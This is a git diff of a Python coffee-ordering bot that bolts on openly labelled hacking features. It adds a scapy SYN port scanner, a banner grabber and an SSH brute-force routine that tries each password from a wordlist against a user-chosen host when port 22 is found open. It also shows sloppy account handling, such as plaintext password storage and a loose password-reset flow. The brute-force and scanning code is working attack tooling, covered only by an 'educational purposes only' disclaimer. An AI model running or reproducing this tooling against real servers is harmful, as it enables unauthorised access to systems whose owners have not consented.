@@ -1,4 +1,5 @@
 #My coffee bot Yaniv Bouzaglo version 1.3
+import socket
 import pymongo
 import time
 import ssl
@@ -6,12 +7,18 @@ from email.message import EmailMessage
 import smtplib
 import random
 import os
+from socket import timeout
+from sys import flags
+from scapy.all import *
+from scapy.layers.inet import TCP, IP, Ether, ICMP
+from scapy.layers.l2 import ARP
+import paramiko
 from dotenv import load_dotenv
 load_dotenv()
 db_creds = os.getenv("db_creds")
 env1 = os.getenv("env1")
 env2 = os.getenv("env2")
-print("Hello and welcome to our Coffee Bot version 1.3 Developed by Yaniv Bouzaglo.\n\n"
+print("Hello and welcome to our Coffee Bot&Network_mapper Brute Forcing&Banner Grabbing able tool version 1.3 Developed by Yaniv Bouzaglo.\n\n"
       "Your Coffee orders will sent from our bot to our working department kitchen directly.\n"
       "This tool is for educational purposes only!, using it for malicious purposes will be on your responsibility.")
 client = pymongo.MongoClient(f"mongodb+srv://{db_creds}.l2zbb.mongodb.net/?retryWrites=true&w=majority")
@@ -19,7 +26,7 @@ db = client.test
 CoffeeBotDB = client["CoffeeBotDB"]
 database = CoffeeBotDB["userDB"]
 orders_history = CoffeeBotDB["orders history"]
-welcome_options = ["[a] Sign up","[b] Sign in","[c] Forgot Password"]
+welcome_options = ["[a] Sign up.","[b] Sign in.","[c] Forgot Password.","[d] Network Mapper.","[e] Banner Grabbing."]
 menu = ["Black Coffee","Cappuccino","Americano","Espresso","Latte","Tea"]
 email_from = f"{env1}"
 email_pass = f"{env2}"
@@ -84,13 +91,12 @@ def sign_up():
                 body = f"""
 Hye there {name} In order to register to our coffee bot please insert the code {code} to the bot .
             """
-                Verfication_Mail(email,body)
                 status = Verfication_Mail(email,body)
                 if status == False:
                     print("Sign up proccess failed please try again.")
                     sign_up()
                 else:
-                    print(f"Two step verification!{code}")
+                    print(f"Two step verification!")
                     code_input = int(input("Insert the six digits code here ==> "))
                 if code_input == code:
                     print("Siginig you up....")
@@ -123,20 +129,139 @@ def sign_in():
             else:
                 fin = False
     return fin 
+def forgot_password():
+    email = input("We'll send an email to reset your password, INSERT EMAIL HERE ==> ")
+    for i in database.find({"Type":"Registered","Email":f"{email}"}):
+        old_password = {"Password":i["Password"]}
+        new_password_input = input("Insert your new password here ==> ")
+        new_password = {"$set":{"Password":f"{new_password_input}"}}
+        code = code_gen()
+        body = f"""
+Hye there, In order to reset your password please insert the code {code} to the bot .
+            """
+        Verfication_Mail(email,body)
+        code_input = int(input("Insert the six digits code here ==> "))
+        if code_input == code:
+            database.update_one(old_password,new_password)
+            print("Your password updated!")
+            main()
+        else:
+            print("Something went wrong with the code inserted, your password did not update.")
+            main()
+    print("Authentication failed!\nRedirecting....")
+    time.sleep(3)
+    main()
+def Network_Mapper():
+        # Asking the user for target ip address
+    target = input("Please insert your target IP: ==> ")
+
+    # Creating variable that equals to all registered ports
+    Registered_Ports = range(1,100)
+
+    # Creating an empty list by name Open_Ports
+    Open_Ports = []
+
+    # Creating scan port function with single argument followed by the name port
+    def ScanPort(port):
+        src_port = RandShort()
+        conf.verb = 0
+        Syn_Pkt = sr1(IP(dst=target)/TCP(sport=src_port,dport=port,flags="S"), timeout=0.5)
+        if Syn_Pkt:
+            if Syn_Pkt.haslayer(TCP):
+                if Syn_Pkt[1].flags == 0x12:
+                    sr(IP(dst=target)/TCP(sport=src_port,dport=port,flags="R"), timeout=2)
+                    return True
+            else:
+                return False
+        else:
+            return False
+    # Creating availability check fuction on the target address
+    def target_availability():
+        try:
+            conf.verb = 0
+            Send_Ping = sr1(IP(dst=target)/ICMP(),timeout=3)
+        except Exception as e:
+            print(e)
+            return False
+
+        if Send_Ping:
+                return True
+    target_availa = target_availability()
+    def attack():
+        if target_availa == True:
+            for port in Registered_Ports:
+                status = ScanPort(port)
+                if status == True:
+                    Open_Ports.append(port)
+            print(f"The scan is complete, the open ports on the target scanned are:\n{Open_Ports}")
+            if 22 in Open_Ports:
+                port = 22
+                brt_frc = input("The scan discovered that port 22 is open would you like to preform brute force on that port? yes/no ==> ")
+                if brt_frc == "yes" or brt_frc == "Yes" or brt_frc == "y" or brt_frc == "Y":
+                    BruteForce(port)
+                else:
+                    print("BYE!")
+                    main()
+    def BruteForce(port):
+        with open("PasswordList.txt","r") as myfile:
+            passwords = myfile.read()
+            passwords = passwords.split()
+            user = input("Please insert the user name you want to preform brute force with : ==> ")
+        SSHconn = paramiko.SSHClient()
+        SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        for password in passwords:
+            try:
+                SSHconn.connect(target, port=int(port), username=user, password=password, timeout=1)
+                print(f"Success, the {password} logged you in the server!")
+                SSHconn.close()
+                break
+            except Exception:
+                print(f"The password {password} failed!")
+    attack()
+def banner_grabbing():
+    while True:
+        try:
+            sock = socket.socket()
+            target = input("Insert your target IP: ==> ")
+            port = input("Insert port to scan in the target machine: ==> ")
+            if "exit" in port or "exit" in target:
+                break
+            else:
+                sock.connect((target, int(port)))
+                sock.send("What is your banner?\r\n".encode())
+                socket.setdefaulttimeout(4)
+                rec = sock.recv(1024).decode()
+                print(f"[+] The banner of the service --> {rec} AND THE PORT IS : ==> {port}")
+                sock.close()
+        except:
+            continue
+    main()
 def main():
     welcome_options_input = input("Choose from the list ahead :\n"
     f"{welcome_options[0]}\n\n"
     f"{welcome_options[1]}\n\n"
     f"{welcome_options[2]}\n\n"
+    f"{welcome_options[3]}\n\n"
+    f"{welcome_options[4]}\n\n"
     "----- INSERT YOUR PICK HERE ----- > ")
     if welcome_options_input == 'a' or welcome_options_input == 'A':
         sign_up()
         print("Sign in to the bot.")
         auth = sign_in()
         if auth == True:
-            print("Signed in successfully!")
-        else:
-            print("Authentication failed!")
+            print("Sending verification email to your mail....")
+            code = code_gen()
+            email = inp_a
+            body = f"""
+Hye there, In order to sign in to our coffee bot please insert the code {code} to the bot .
+            """
+            Verfication_Mail(email,body)
+            code_input = int(input("Insert the six digits code here ==> "))
+            if code_input == code:
+                print("Signed in successfully!")
+            else:
+                print("Authentication failed!\nDisconnecting....")
+                exit()
     elif welcome_options_input == 'b' or welcome_options_input == 'B':
         auth = sign_in()
         if auth == True:
@@ -151,13 +276,18 @@ Hye there, In order to sign in to our coffee bot please insert the code {code} t
             if code_input == code:
                 print("Signed in successfully!")
             else:
-                print("Authentication failed!")
-                sign_in()
+                print("Authentication failed!\nDisconnecting....")
+                time.sleep(3)
+                exit()
         else:
             print("Wrong mail address or password.")
             main()
     elif  welcome_options_input == 'c' or welcome_options_input == 'C':
-        pass
+        forgot_password()
+    elif welcome_options_input == 'd' or welcome_options_input == 'D':
+        Network_Mapper()
+    elif welcome_options_input == 'e' or welcome_options_input == 'E':
+        banner_grabbing()
     else:
         pass
 main()
